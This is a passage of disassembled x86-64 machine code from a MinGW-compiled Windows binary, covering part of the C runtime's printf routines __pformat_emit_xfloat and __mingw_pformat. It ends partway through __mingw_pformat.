   14000533a:	83 e1 0f             	and    $0xf,%ecx
   14000533d:	83 f8 01             	cmp    $0x1,%eax
   140005340:	0f 84 da 00 00 00    	je     140005420 <__pformat_emit_xfloat.isra.0+0x170>
   140005346:	8b 53 10             	mov    0x10(%rbx),%edx
   140005349:	85 d2                	test   %edx,%edx
   14000534b:	7e 06                	jle    140005353 <__pformat_emit_xfloat.isra.0+0xa3>
   14000534d:	83 ea 01             	sub    $0x1,%edx
   140005350:	89 53 10             	mov    %edx,0x10(%rbx)
   140005353:	85 c9                	test   %ecx,%ecx
   140005355:	74 b9                	je     140005310 <__pformat_emit_xfloat.isra.0+0x60>
   140005357:	89 ca                	mov    %ecx,%edx
   140005359:	83 f9 09             	cmp    $0x9,%ecx
   14000535c:	76 c0                	jbe    14000531e <__pformat_emit_xfloat.isra.0+0x6e>
   14000535e:	83 c2 37             	add    $0x37,%edx
   140005361:	48 89 f1             	mov    %rsi,%rcx
   140005364:	44 09 da             	or     %r11d,%edx
   140005367:	eb bb                	jmp    140005324 <__pformat_emit_xfloat.isra.0+0x74>
   140005369:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005370:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140005375:	b8 04 00 00 00       	mov    $0x4,%eax
   14000537a:	49 d1 e9             	shr    $1,%r9
   14000537d:	44 29 c1             	sub    %r8d,%ecx
   140005380:	c1 e1 02             	shl    $0x2,%ecx
   140005383:	48 d3 e0             	shl    %cl,%rax
   140005386:	4c 01 c8             	add    %r9,%rax
   140005389:	0f 89 49 03 00 00    	jns    1400056d8 <__pformat_emit_xfloat.isra.0+0x428>
   14000538f:	b9 0f 00 00 00       	mov    $0xf,%ecx
   140005394:	48 c1 e8 03          	shr    $0x3,%rax
   140005398:	44 8d 52 01          	lea    0x1(%rdx),%r10d
   14000539c:	44 29 c1             	sub    %r8d,%ecx
   14000539f:	49 0f bf ea          	movswq %r10w,%rbp
   1400053a3:	c1 e1 02             	shl    $0x2,%ecx
   1400053a6:	48 d3 e8             	shr    %cl,%rax
   1400053a9:	49 89 c1             	mov    %rax,%r9
   1400053ac:	41 8d 40 01          	lea    0x1(%r8),%eax
   1400053b0:	e9 3f ff ff ff       	jmp    1400052f4 <__pformat_emit_xfloat.isra.0+0x44>
   1400053b5:	0f 1f 00             	nopl   (%rax)
   1400053b8:	41 83 f8 0e          	cmp    $0xe,%r8d
   1400053bc:	0f 87 f6 02 00 00    	ja     1400056b8 <__pformat_emit_xfloat.isra.0+0x408>
   1400053c2:	b9 0e 00 00 00       	mov    $0xe,%ecx
   1400053c7:	b8 04 00 00 00       	mov    $0x4,%eax
   1400053cc:	31 ed                	xor    %ebp,%ebp
   1400053ce:	45 31 d2             	xor    %r10d,%r10d
   1400053d1:	44 29 c1             	sub    %r8d,%ecx
   1400053d4:	c1 e1 02             	shl    $0x2,%ecx
   1400053d7:	48 d3 e0             	shl    %cl,%rax
   1400053da:	b9 0f 00 00 00       	mov    $0xf,%ecx
   1400053df:	48 01 c0             	add    %rax,%rax
   1400053e2:	44 29 c1             	sub    %r8d,%ecx
   1400053e5:	c1 e1 02             	shl    $0x2,%ecx
   1400053e8:	48 d3 e8             	shr    %cl,%rax
   1400053eb:	49 89 c1             	mov    %rax,%r9
   1400053ee:	48 85 c0             	test   %rax,%rax
   1400053f1:	75 b9                	jne    1400053ac <__pformat_emit_xfloat.isra.0+0xfc>
   1400053f3:	45 85 c0             	test   %r8d,%r8d
   1400053f6:	75 b4                	jne    1400053ac <__pformat_emit_xfloat.isra.0+0xfc>
   1400053f8:	44 8b 43 08          	mov    0x8(%rbx),%r8d
   1400053fc:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140005401:	48 89 f8             	mov    %rdi,%rax
   140005404:	41 f7 c0 00 08 00 00 	test   $0x800,%r8d
   14000540b:	74 0a                	je     140005417 <__pformat_emit_xfloat.isra.0+0x167>
   14000540d:	c6 44 24 30 2e       	movb   $0x2e,0x30(%rsp)
   140005412:	48 8d 44 24 31       	lea    0x31(%rsp),%rax
   140005417:	c6 00 30             	movb   $0x30,(%rax)
   14000541a:	48 8d 70 01          	lea    0x1(%rax),%rsi
   14000541e:	eb 49                	jmp    140005469 <__pformat_emit_xfloat.isra.0+0x1b9>
   140005420:	48 39 f7             	cmp    %rsi,%rdi
   140005423:	72 1b                	jb     140005440 <__pformat_emit_xfloat.isra.0+0x190>
   140005425:	41 f7 c0 00 08 00 00 	test   $0x800,%r8d
   14000542c:	75 12                	jne    140005440 <__pformat_emit_xfloat.isra.0+0x190>
   14000542e:	8b 53 10             	mov    0x10(%rbx),%edx
   140005431:	85 d2                	test   %edx,%edx
   140005433:	0f 8e df 02 00 00    	jle    140005718 <__pformat_emit_xfloat.isra.0+0x468>
   140005439:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005440:	c6 06 2e             	movb   $0x2e,(%rsi)
   140005443:	48 83 c6 01          	add    $0x1,%rsi
   140005447:	e9 07 ff ff ff       	jmp    140005353 <__pformat_emit_xfloat.isra.0+0xa3>
   14000544c:	85 d2                	test   %edx,%edx
   14000544e:	0f 85 0f 03 00 00    	jne    140005763 <__pformat_emit_xfloat.isra.0+0x4b3>
   140005454:	c6 06 30             	movb   $0x30,(%rsi)
   140005457:	48 83 c6 01          	add    $0x1,%rsi
   14000545b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005460:	48 39 fe             	cmp    %rdi,%rsi
   140005463:	0f 84 d7 02 00 00    	je     140005740 <__pformat_emit_xfloat.isra.0+0x490>
   140005469:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   14000546d:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   140005473:	45 85 c9             	test   %r9d,%r9d
   140005476:	0f 8e 8a 00 00 00    	jle    140005506 <__pformat_emit_xfloat.isra.0+0x256>
   14000547c:	8b 53 10             	mov    0x10(%rbx),%edx
   14000547f:	48 89 f1             	mov    %rsi,%rcx
   140005482:	41 0f bf c2          	movswl %r10w,%eax
   140005486:	48 29 f9             	sub    %rdi,%rcx
   140005489:	44 8d 1c 0a          	lea    (%rdx,%rcx,1),%r11d
   14000548d:	85 d2                	test   %edx,%edx
   14000548f:	44 89 c2             	mov    %r8d,%edx
   140005492:	41 0f 4f cb          	cmovg  %r11d,%ecx
   140005496:	81 e2 c0 01 00 00    	and    $0x1c0,%edx
   14000549c:	83 fa 01             	cmp    $0x1,%edx
   14000549f:	49 0f bf d2          	movswq %r10w,%rdx
   1400054a3:	83 d9 fa             	sbb    $0xfffffffa,%ecx
   1400054a6:	48 69 d2 67 66 66 66 	imul   $0x66666667,%rdx,%rdx
   1400054ad:	c1 f8 1f             	sar    $0x1f,%eax
   1400054b0:	41 89 cb             	mov    %ecx,%r11d
   1400054b3:	48 c1 fa 22          	sar    $0x22,%rdx
   1400054b7:	29 c2                	sub    %eax,%edx
   1400054b9:	74 2e                	je     1400054e9 <__pformat_emit_xfloat.isra.0+0x239>
   1400054bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400054c0:	48 63 c2             	movslq %edx,%rax
   1400054c3:	c1 fa 1f             	sar    $0x1f,%edx
   1400054c6:	41 83 c3 01          	add    $0x1,%r11d
   1400054ca:	48 69 c0 67 66 66 66 	imul   $0x66666667,%rax,%rax
   1400054d1:	48 c1 f8 22          	sar    $0x22,%rax
   1400054d5:	29 d0                	sub    %edx,%eax
   1400054d7:	89 c2                	mov    %eax,%edx
   1400054d9:	75 e5                	jne    1400054c0 <__pformat_emit_xfloat.isra.0+0x210>
   1400054db:	45 89 dc             	mov    %r11d,%r12d
   1400054de:	41 29 cc             	sub    %ecx,%r12d
   1400054e1:	41 83 c4 02          	add    $0x2,%r12d
   1400054e5:	45 0f bf e4          	movswl %r12w,%r12d
   1400054e9:	45 39 d9             	cmp    %r11d,%r9d
   1400054ec:	0f 8e 66 01 00 00    	jle    140005658 <__pformat_emit_xfloat.isra.0+0x3a8>
   1400054f2:	45 29 d9             	sub    %r11d,%r9d
   1400054f5:	41 f7 c0 00 06 00 00 	test   $0x600,%r8d
   1400054fc:	0f 84 7e 01 00 00    	je     140005680 <__pformat_emit_xfloat.isra.0+0x3d0>
   140005502:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
   140005506:	41 f6 c0 80          	test   $0x80,%r8b
   14000550a:	0f 85 30 01 00 00    	jne    140005640 <__pformat_emit_xfloat.isra.0+0x390>
   140005510:	41 f7 c0 00 01 00 00 	test   $0x100,%r8d
   140005517:	0f 85 4b 01 00 00    	jne    140005668 <__pformat_emit_xfloat.isra.0+0x3b8>
   14000551d:	41 83 e0 40          	and    $0x40,%r8d
   140005521:	0f 85 d9 01 00 00    	jne    140005700 <__pformat_emit_xfloat.isra.0+0x450>
   140005527:	48 89 da             	mov    %rbx,%rdx
   14000552a:	b9 30 00 00 00       	mov    $0x30,%ecx
   14000552f:	e8 7c e6 ff ff       	call   140003bb0 <__pformat_putc>
   140005534:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140005537:	48 89 da             	mov    %rbx,%rdx
   14000553a:	83 e1 20             	and    $0x20,%ecx
   14000553d:	83 c9 58             	or     $0x58,%ecx
   140005540:	e8 6b e6 ff ff       	call   140003bb0 <__pformat_putc>
   140005545:	8b 43 0c             	mov    0xc(%rbx),%eax
   140005548:	85 c0                	test   %eax,%eax
   14000554a:	7e 2e                	jle    14000557a <__pformat_emit_xfloat.isra.0+0x2ca>
   14000554c:	f6 43 09 02          	testb  $0x2,0x9(%rbx)
   140005550:	74 28                	je     14000557a <__pformat_emit_xfloat.isra.0+0x2ca>
   140005552:	83 e8 01             	sub    $0x1,%eax
   140005555:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005558:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000555f:	00 
   140005560:	48 89 da             	mov    %rbx,%rdx
   140005563:	b9 30 00 00 00       	mov    $0x30,%ecx
   140005568:	e8 43 e6 ff ff       	call   140003bb0 <__pformat_putc>
   14000556d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140005570:	8d 50 ff             	lea    -0x1(%rax),%edx
   140005573:	89 53 0c             	mov    %edx,0xc(%rbx)
   140005576:	85 c0                	test   %eax,%eax
   140005578:	7f e6                	jg     140005560 <__pformat_emit_xfloat.isra.0+0x2b0>
   14000557a:	4c 8d 6c 24 2e       	lea    0x2e(%rsp),%r13
   14000557f:	48 39 f7             	cmp    %rsi,%rdi
   140005582:	72 23                	jb     1400055a7 <__pformat_emit_xfloat.isra.0+0x2f7>
   140005584:	eb 4f                	jmp    1400055d5 <__pformat_emit_xfloat.isra.0+0x325>
   140005586:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000558d:	00 00 00 
   140005590:	0f b7 43 20          	movzwl 0x20(%rbx),%eax
   140005594:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   140005599:	66 85 c0             	test   %ax,%ax
   14000559c:	0f 85 86 00 00 00    	jne    140005628 <__pformat_emit_xfloat.isra.0+0x378>
   1400055a2:	48 39 fe             	cmp    %rdi,%rsi
   1400055a5:	74 2e                	je     1400055d5 <__pformat_emit_xfloat.isra.0+0x325>
   1400055a7:	0f be 4e ff          	movsbl -0x1(%rsi),%ecx
   1400055ab:	48 83 ee 01          	sub    $0x1,%rsi
   1400055af:	83 f9 2e             	cmp    $0x2e,%ecx
   1400055b2:	74 64                	je     140005618 <__pformat_emit_xfloat.isra.0+0x368>
   1400055b4:	83 f9 2c             	cmp    $0x2c,%ecx
   1400055b7:	74 d7                	je     140005590 <__pformat_emit_xfloat.isra.0+0x2e0>
   1400055b9:	48 89 da             	mov    %rbx,%rdx
   1400055bc:	e8 ef e5 ff ff       	call   140003bb0 <__pformat_putc>
   1400055c1:	eb df                	jmp    1400055a2 <__pformat_emit_xfloat.isra.0+0x2f2>
   1400055c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400055c8:	48 89 da             	mov    %rbx,%rdx
   1400055cb:	b9 30 00 00 00       	mov    $0x30,%ecx
   1400055d0:	e8 db e5 ff ff       	call   140003bb0 <__pformat_putc>
   1400055d5:	8b 43 10             	mov    0x10(%rbx),%eax
   1400055d8:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400055db:	89 53 10             	mov    %edx,0x10(%rbx)
   1400055de:	85 c0                	test   %eax,%eax
   1400055e0:	7f e6                	jg     1400055c8 <__pformat_emit_xfloat.isra.0+0x318>
   1400055e2:	8b 4b 08             	mov    0x8(%rbx),%ecx
   1400055e5:	48 89 da             	mov    %rbx,%rdx
   1400055e8:	83 e1 20             	and    $0x20,%ecx
   1400055eb:	83 c9 50             	or     $0x50,%ecx
   1400055ee:	e8 bd e5 ff ff       	call   140003bb0 <__pformat_putc>
   1400055f3:	44 01 63 0c          	add    %r12d,0xc(%rbx)
   1400055f7:	48 89 da             	mov    %rbx,%rdx
   1400055fa:	48 89 e9             	mov    %rbp,%rcx
   1400055fd:	81 4b 08 c0 01 00 00 	orl    $0x1c0,0x8(%rbx)
   140005604:	48 83 c4 58          	add    $0x58,%rsp
   140005608:	5b                   	pop    %rbx
   140005609:	5e                   	pop    %rsi
   14000560a:	5f                   	pop    %rdi
   14000560b:	5d                   	pop    %rbp
   14000560c:	41 5c                	pop    %r12
   14000560e:	41 5d                	pop    %r13
   140005610:	e9 cb ef ff ff       	jmp    1400045e0 <__pformat_int.isra.0>
   140005615:	0f 1f 00             	nopl   (%rax)
   140005618:	48 89 d9             	mov    %rbx,%rcx
   14000561b:	e8 70 f3 ff ff       	call   140004990 <__pformat_emit_radix_point>
   140005620:	eb 80                	jmp    1400055a2 <__pformat_emit_xfloat.isra.0+0x2f2>
   140005622:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005628:	49 89 d8             	mov    %rbx,%r8
   14000562b:	ba 01 00 00 00       	mov    $0x1,%edx
   140005630:	4c 89 e9             	mov    %r13,%rcx
   140005633:	e8 d8 e5 ff ff       	call   140003c10 <__pformat_wputchars>
   140005638:	e9 65 ff ff ff       	jmp    1400055a2 <__pformat_emit_xfloat.isra.0+0x2f2>
   14000563d:	0f 1f 00             	nopl   (%rax)
   140005640:	48 89 da             	mov    %rbx,%rdx
   140005643:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140005648:	e8 63 e5 ff ff       	call   140003bb0 <__pformat_putc>
   14000564d:	e9 d5 fe ff ff       	jmp    140005527 <__pformat_emit_xfloat.isra.0+0x277>
   140005652:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005658:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   14000565e:	e9 9f fe ff ff       	jmp    140005502 <__pformat_emit_xfloat.isra.0+0x252>
   140005663:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005668:	48 89 da             	mov    %rbx,%rdx
   14000566b:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   140005670:	e8 3b e5 ff ff       	call   140003bb0 <__pformat_putc>
   140005675:	e9 ad fe ff ff       	jmp    140005527 <__pformat_emit_xfloat.isra.0+0x277>
   14000567a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005680:	41 83 e9 01          	sub    $0x1,%r9d
   140005684:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
   140005688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000568f:	00 
   140005690:	48 89 da             	mov    %rbx,%rdx
   140005693:	b9 20 00 00 00       	mov    $0x20,%ecx
   140005698:	e8 13 e5 ff ff       	call   140003bb0 <__pformat_putc>
   14000569d:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400056a0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400056a3:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400056a6:	85 c0                	test   %eax,%eax
   1400056a8:	7f e6                	jg     140005690 <__pformat_emit_xfloat.isra.0+0x3e0>
   1400056aa:	44 8b 43 08          	mov    0x8(%rbx),%r8d
   1400056ae:	e9 53 fe ff ff       	jmp    140005506 <__pformat_emit_xfloat.isra.0+0x256>
   1400056b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400056b8:	45 85 c0             	test   %r8d,%r8d
   1400056bb:	0f 8e 8f 00 00 00    	jle    140005750 <__pformat_emit_xfloat.isra.0+0x4a0>
   1400056c1:	31 ed                	xor    %ebp,%ebp
   1400056c3:	45 31 d2             	xor    %r10d,%r10d
   1400056c6:	45 31 c9             	xor    %r9d,%r9d
   1400056c9:	b8 10 00 00 00       	mov    $0x10,%eax
   1400056ce:	e9 21 fc ff ff       	jmp    1400052f4 <__pformat_emit_xfloat.isra.0+0x44>
   1400056d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400056d8:	49 0f bf ea          	movswq %r10w,%rbp
   1400056dc:	e9 f9 fc ff ff       	jmp    1400053da <__pformat_emit_xfloat.isra.0+0x12a>
   1400056e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400056e8:	45 85 c0             	test   %r8d,%r8d
   1400056eb:	0f 8f 03 fc ff ff    	jg     1400052f4 <__pformat_emit_xfloat.isra.0+0x44>
   1400056f1:	e9 02 fd ff ff       	jmp    1400053f8 <__pformat_emit_xfloat.isra.0+0x148>
   1400056f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400056fd:	00 00 00 
   140005700:	48 89 da             	mov    %rbx,%rdx
   140005703:	b9 20 00 00 00       	mov    $0x20,%ecx
   140005708:	e8 a3 e4 ff ff       	call   140003bb0 <__pformat_putc>
   14000570d:	e9 15 fe ff ff       	jmp    140005527 <__pformat_emit_xfloat.isra.0+0x277>
   140005712:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005718:	85 c9                	test   %ecx,%ecx
   14000571a:	0f 84 2c fd ff ff    	je     14000544c <__pformat_emit_xfloat.isra.0+0x19c>
   140005720:	89 ca                	mov    %ecx,%edx
   140005722:	83 f9 09             	cmp    $0x9,%ecx
   140005725:	0f 87 33 fc ff ff    	ja     14000535e <__pformat_emit_xfloat.isra.0+0xae>
   14000572b:	83 c1 30             	add    $0x30,%ecx
   14000572e:	48 83 c6 01          	add    $0x1,%rsi
   140005732:	88 4e ff             	mov    %cl,-0x1(%rsi)
   140005735:	e9 26 fd ff ff       	jmp    140005460 <__pformat_emit_xfloat.isra.0+0x1b0>
   14000573a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005740:	8b 43 10             	mov    0x10(%rbx),%eax
   140005743:	85 c0                	test   %eax,%eax
   140005745:	0f 8f c2 fc ff ff    	jg     14000540d <__pformat_emit_xfloat.isra.0+0x15d>
   14000574b:	e9 b1 fc ff ff       	jmp    140005401 <__pformat_emit_xfloat.isra.0+0x151>
   140005750:	44 8b 43 08          	mov    0x8(%rbx),%r8d
   140005754:	31 ed                	xor    %ebp,%ebp
   140005756:	45 31 d2             	xor    %r10d,%r10d
   140005759:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   14000575e:	e9 9e fc ff ff       	jmp    140005401 <__pformat_emit_xfloat.isra.0+0x151>
   140005763:	48 39 fe             	cmp    %rdi,%rsi
   140005766:	0f 85 fd fc ff ff    	jne    140005469 <__pformat_emit_xfloat.isra.0+0x1b9>
   14000576c:	8b 53 10             	mov    0x10(%rbx),%edx
   14000576f:	85 d2                	test   %edx,%edx
   140005771:	0f 8f 96 fc ff ff    	jg     14000540d <__pformat_emit_xfloat.isra.0+0x15d>
   140005777:	48 89 f8             	mov    %rdi,%rax
   14000577a:	e9 98 fc ff ff       	jmp    140005417 <__pformat_emit_xfloat.isra.0+0x167>
   14000577f:	90                   	nop

0000000140005780 <__mingw_pformat>:
   140005780:	41 57                	push   %r15
   140005782:	41 56                	push   %r14
   140005784:	41 55                	push   %r13
   140005786:	41 54                	push   %r12
   140005788:	55                   	push   %rbp
   140005789:	57                   	push   %rdi
   14000578a:	56                   	push   %rsi
   14000578b:	53                   	push   %rbx
   14000578c:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   140005793:	4c 8b ac 24 10 01 00 	mov    0x110(%rsp),%r13
   14000579a:	00 
   14000579b:	89 cf                	mov    %ecx,%edi
   14000579d:	48 89 d5             	mov    %rdx,%rbp
   1400057a0:	44 89 c3             	mov    %r8d,%ebx
   1400057a3:	4c 89 ce             	mov    %r9,%rsi
   1400057a6:	e8 bd 3b 00 00       	call   140009368 <_errno>
   1400057ab:	0f be 0e             	movsbl (%rsi),%ecx
   1400057ae:	81 e7 00 60 00 00    	and    $0x6000,%edi
   1400057b4:	31 d2                	xor    %edx,%edx
   1400057b6:	8b 00                	mov    (%rax),%eax
   1400057b8:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%rsp)
   1400057bf:	48 8d 5e 01          	lea    0x1(%rsi),%rbx
   1400057c3:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   1400057c8:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400057cc:	48 b8 ff ff ff ff fd 	movabs $0xfffffffdffffffff,%rax
   1400057d3:	ff ff ff 
   1400057d6:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400057dd:	00 
   1400057de:	31 c0                	xor    %eax,%eax
   1400057e0:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   1400057e7:	00 
   1400057e8:	89 c8                	mov    %ecx,%eax
   1400057ea:	89 7c 24 78          	mov    %edi,0x78(%rsp)
   1400057ee:	c7 44 24 7c ff ff ff 	movl   $0xffffffff,0x7c(%rsp)
   1400057f5:	ff 
   1400057f6:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
   1400057fd:	00 00 00 00 
   140005801:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
   140005808:	00 
   140005809:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
   140005810:	00 00 00 00 
   140005814:	c7 84 24 9c 00 00 00 	movl   $0xffffffff,0x9c(%rsp)
   14000581b:	ff ff ff ff 
   14000581f:	85 c9                	test   %ecx,%ecx
   140005821:	0f 84 40 01 00 00    	je     140005967 <__mingw_pformat+0x1e7>
   140005827:	4c 8d 7c 24 7c       	lea    0x7c(%rsp),%r15
   14000582c:	4c 8d 25 9d 5d 00 00 	lea    0x5d9d(%rip),%r12        # 14000b5d0 <.rdata+0x20>
   140005833:	eb 49                	jmp    14000587e <__mingw_pformat+0xfe>
   140005835:	0f 1f 00             	nopl   (%rax)
   140005838:	8b 54 24 78          	mov    0x78(%rsp),%edx
   14000583c:	8b b4 24 94 00 00 00 	mov    0x94(%rsp),%esi
   140005843:	f6 c6 40             	test   $0x40,%dh
   140005846:	75 09                	jne    140005851 <__mingw_pformat+0xd1>
   140005848:	39 b4 24 98 00 00 00 	cmp    %esi,0x98(%rsp)
   14000584f:	7e 11                	jle    140005862 <__mingw_pformat+0xe2>
   140005851:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   140005856:	80 e6 20             	and    $0x20,%dh
   140005859:	75 6d                	jne    1400058c8 <__mingw_pformat+0x148>
   14000585b:	48 63 d6             	movslq %esi,%rdx
   14000585e:	41 88 04 10          	mov    %al,(%r8,%rdx,1)
   140005862:	83 c6 01             	add    $0x1,%esi
   140005865:	89 b4 24 94 00 00 00 	mov    %esi,0x94(%rsp)
   14000586c:	0f b6 03             	movzbl (%rbx),%eax
   14000586f:	48 83 c3 01          	add    $0x1,%rbx
   140005873:	0f be c8             	movsbl %al,%ecx
   140005876:	85 c9                	test   %ecx,%ecx
   140005878:	0f 84 e2 00 00 00    	je     140005960 <__mingw_pformat+0x1e0>
   14000587e:	83 f9 25             	cmp    $0x25,%ecx
   140005881:	75 b5                	jne    140005838 <__mingw_pformat+0xb8>
   140005883:	0f b6 03             	movzbl (%rbx),%eax
   140005886:	89 7c 24 78          	mov    %edi,0x78(%rsp)
   14000588a:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   140005891:	ff ff 
   140005893:	84 c0                	test   %al,%al
   140005895:	0f 84 c5 00 00 00    	je     140005960 <__mingw_pformat+0x1e0>
   14000589b:	48 89 de             	mov    %rbx,%rsi
   14000589e:	4d 89 fb             	mov    %r15,%r11
   1400058a1:	45 31 d2             	xor    %r10d,%r10d
   1400058a4:	45 31 f6             	xor    %r14d,%r14d
   1400058a7:	8d 50 e0             	lea    -0x20(%rax),%edx
   1400058aa:	48 8d 6e 01          	lea    0x1(%rsi),%rbp
   1400058ae:	0f be c8             	movsbl %al,%ecx
   1400058b1:	80 fa 5a             	cmp    $0x5a,%dl
   1400058b4:	77 5a                	ja     140005910 <__mingw_pformat+0x190>
   1400058b6:	0f b6 d2             	movzbl %dl,%edx
   1400058b9:	49 63 14 94          	movslq (%r12,%rdx,4),%rdx
   1400058bd:	4c 01 e2             	add    %r12,%rdx
   1400058c0:	ff e2                	jmp    *%rdx
   1400058c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400058c8:	4c 89 c2             	mov    %r8,%rdx
   1400058cb:	e8 e0 3a 00 00       	call   1400093b0 <fputc>
   1400058d0:	eb 90                	jmp    140005862 <__mingw_pformat+0xe2>
   1400058d2:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   1400058d6:	3c 36                	cmp    $0x36,%al
   1400058d8:	0f 84 ba 08 00 00    	je     140006198 <__mingw_pformat+0xa18>
   1400058de:	3c 33                	cmp    $0x33,%al
   1400058e0:	0f 85 c8 07 00 00    	jne    1400060ae <__mingw_pformat+0x92e>
   1400058e6:	80 7e 02 32          	cmpb   $0x32,0x2(%rsi)
   1400058ea:	0f 84 78 09 00 00    	je     140006268 <__mingw_pformat+0xae8>
   1400058f0:	48 8d 56 02          	lea    0x2(%rsi),%rdx
   1400058f4:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   1400058fa:	48 89 ee             	mov    %rbp,%rsi
   1400058fd:	b9 33 00 00 00       	mov    $0x33,%ecx
   140005902:	48 89 d5             	mov    %rdx,%rbp
   140005905:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000590b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005910:	83 e8 30             	sub    $0x30,%eax
   140005913:	3c 09                	cmp    $0x9,%al
   140005915:	0f 87 87 08 00 00    	ja     1400061a2 <__mingw_pformat+0xa22>
   14000591b:	41 83 fe 04          	cmp    $0x4,%r14d
   14000591f:	0f 84 7d 08 00 00    	je     1400061a2 <__mingw_pformat+0xa22>
   140005925:	45 85 f6             	test   %r14d,%r14d
   140005928:	0f 85 3a 07 00 00    	jne    140006068 <__mingw_pformat+0x8e8>
   14000592e:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140005934:	4d 85 db             	test   %r11,%r11
   140005937:	74 17                	je     140005950 <__mingw_pformat+0x1d0>
   140005939:	41 8b 03             	mov    (%r11),%eax
   14000593c:	85 c0                	test   %eax,%eax
   14000593e:	0f 88 f9 07 00 00    	js     14000613d <__mingw_pformat+0x9bd>
   140005944:	8d 04 80             	lea    (%rax,%rax,4),%eax
   140005947:	8d 44 41 d0          	lea    -0x30(%rcx,%rax,2),%eax
   14000594b:	41 89 03             	mov    %eax,(%r11)
   14000594e:	66 90                	xchg   %ax,%ax
   140005950:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005954:	48 89 ee             	mov    %rbp,%rsi
   140005957:	84 c0                	test   %al,%al
   140005959:	0f 85 48 ff ff ff    	jne    1400058a7 <__mingw_pformat+0x127>
   14000595f:	90                   	nop
   140005960:	8b 8c 24 94 00 00 00 	mov    0x94(%rsp),%ecx
   140005967:	89 c8                	mov    %ecx,%eax
   140005969:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   140005970:	5b                   	pop    %rbx
   140005971:	5e                   	pop    %rsi
   140005972:	5f                   	pop    %rdi
   140005973:	5d                   	pop    %rbp
   140005974:	41 5c                	pop    %r12
   140005976:	41 5d                	pop    %r13
   140005978:	41 5e                	pop    %r14
   14000597a:	41 5f                	pop    %r15
   14000597c:	c3                   	ret
   14000597d:	0f 1f 00             	nopl   (%rax)
   140005980:	81 64 24 78 ff fe ff 	andl   $0xfffffeff,0x78(%rsp)
   140005987:	ff 
   140005988:	41 83 fa 03          	cmp    $0x3,%r10d
   14000598c:	0f 84 e2 07 00 00    	je     140006174 <__mingw_pformat+0x9f4>
   140005992:	41 83 fa 02          	cmp    $0x2,%r10d
   140005996:	0f 84 8c 08 00 00    	je     140006228 <__mingw_pformat+0xaa8>
   14000599c:	41 8b 45 00          	mov    0x0(%r13),%eax
   1400059a0:	41 83 fa 01          	cmp    $0x1,%r10d
   1400059a4:	0f 84 7a 07 00 00    	je     140006124 <__mingw_pformat+0x9a4>
   1400059aa:	89 c2                	mov    %eax,%edx
   1400059ac:	41 83 fa 05          	cmp    $0x5,%r10d
   1400059b0:	0f b6 c0             	movzbl %al,%eax
   1400059b3:	48 0f 45 c2          	cmovne %rdx,%rax
   1400059b7:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400059bc:	83 f9 75             	cmp    $0x75,%ecx
   1400059bf:	0f 84 c1 07 00 00    	je     140006186 <__mingw_pformat+0xa06>
   1400059c5:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400059ca:	48 89 c2             	mov    %rax,%rdx
   1400059cd:	e8 fe e5 ff ff       	call   140003fd0 <__pformat_xint.isra.0>
   1400059d2:	e9 b1 00 00 00       	jmp    140005a88 <__mingw_pformat+0x308>
   1400059d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400059de:	00 00 
